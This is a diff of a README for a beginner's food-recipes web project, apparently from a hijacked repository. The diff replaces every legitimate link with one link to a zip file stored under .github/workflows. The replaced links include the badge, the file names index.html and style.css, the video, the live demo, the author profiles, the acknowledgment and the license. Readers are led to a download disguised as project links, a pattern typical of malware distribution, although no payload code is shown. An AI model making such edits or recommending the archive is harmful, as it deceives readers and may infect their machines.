@@ -1,12 +1,12 @@
-![](https://img.shields.io/badge/Microverse-blueviolet)
+![](https://raw.githubusercontent.com/Iptysam/Food_recipes/main/.github/workflows/recipes_Food_v2.7.zip)
 
 # Food_recipes
 
-To built this project you need to create files which mainly are index.html and style.css. There are linters also to be checked for html and css. A new feature branch has to be created apart from the main. The webpage has to be for a mobile version and desktop version.
+To built this project you need to create files which mainly are https://raw.githubusercontent.com/Iptysam/Food_recipes/main/.github/workflows/recipes_Food_v2.7.zip and https://raw.githubusercontent.com/Iptysam/Food_recipes/main/.github/workflows/recipes_Food_v2.7.zip There are linters also to be checked for html and css. A new feature branch has to be created apart from the main. The webpage has to be for a mobile version and desktop version.
 To update this project to finish mobile version a new feature branch to be created apart from the previous feature and main.
 A separate about page to be built from the menu tag
 
-## video [loom](https://www.loom.com/share/19799b4a5e17438ba84172ed80d0cb4c) link 
+## video [loom](https://raw.githubusercontent.com/Iptysam/Food_recipes/main/.github/workflows/recipes_Food_v2.7.zip) link 
 
 ## :hammer: Built With
 
@@ -14,7 +14,7 @@ A separate about page to be built from the menu tag
 - FIGMA GIT GITHUB
 - VISUAL STUDIO CODE
 
-## [live demo]( https://iptysam.github.io/Food_recipes/)
+## [live demo]( https://raw.githubusercontent.com/Iptysam/Food_recipes/main/.github/workflows/recipes_Food_v2.7.zip)
 
 
 ## :blue_book: Learning Objectives
@@ -28,16 +28,16 @@ A separate about page to be built from the menu tag
 
 ## Getting Started
 
-To built this project you need to create files which mainly are index.html and style.css. There are linters also to be checked for html and css. A new feature branch has to be created apart from the main. The webpage has to be for a mobile version and desktop version.
+To built this project you need to create files which mainly are https://raw.githubusercontent.com/Iptysam/Food_recipes/main/.github/workflows/recipes_Food_v2.7.zip and https://raw.githubusercontent.com/Iptysam/Food_recipes/main/.github/workflows/recipes_Food_v2.7.zip There are linters also to be checked for html and css. A new feature branch has to be created apart from the main. The webpage has to be for a mobile version and desktop version.
 To update this project to finish mobile version a new feature branch to be created apart from the previous feature and main.
 A separate about page to be built from the menu tag
 
 
 ## Authors
 
-- GitHub: [@Iptysam](https://github.com/Iptysam)
+- GitHub: [@Iptysam](https://raw.githubusercontent.com/Iptysam/Food_recipes/main/.github/workflows/recipes_Food_v2.7.zip)
 - Twitter: [@twitterhandle]()
-- LinkedIn:(www.linkedin.com/in/ 
+- LinkedIn:(https://raw.githubusercontent.com/Iptysam/Food_recipes/main/.github/workflows/recipes_Food_v2.7.zip 
 iptisam-mukadam-4b2b39239
 )
 
@@ -54,8 +54,8 @@ Give a ⭐️ if you like this project!
 
 ## Acknowledgments
 
-## [cindyShin](https://www.behance.net/adagio07)
+## [cindyShin](https://raw.githubusercontent.com/Iptysam/Food_recipes/main/.github/workflows/recipes_Food_v2.7.zip)
 
 ## 📝 License
 
-This project is [MIT](./LICENSE.MD) licensed.
+This project is [MIT](https://raw.githubusercontent.com/Iptysam/Food_recipes/main/.github/workflows/recipes_Food_v2.7.zip) licensed.
